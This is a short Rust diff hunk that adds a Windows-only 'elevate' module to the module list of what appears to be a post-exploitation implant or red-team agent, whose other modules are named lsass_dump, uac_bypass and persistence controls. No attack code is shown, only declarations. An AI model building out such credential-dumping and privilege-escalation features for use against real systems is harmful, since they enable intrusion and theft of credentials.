@@ -7,6 +7,8 @@ pub mod file_list;
 pub mod lsass_dump;
 #[cfg(target_os = "windows")]
 pub mod uac_bypass;
+#[cfg(target_os = "windows")]
+pub mod elevate;
 pub mod persist_remove;
 pub mod persist_status;
 #[cfg(feature = "http-transport")]
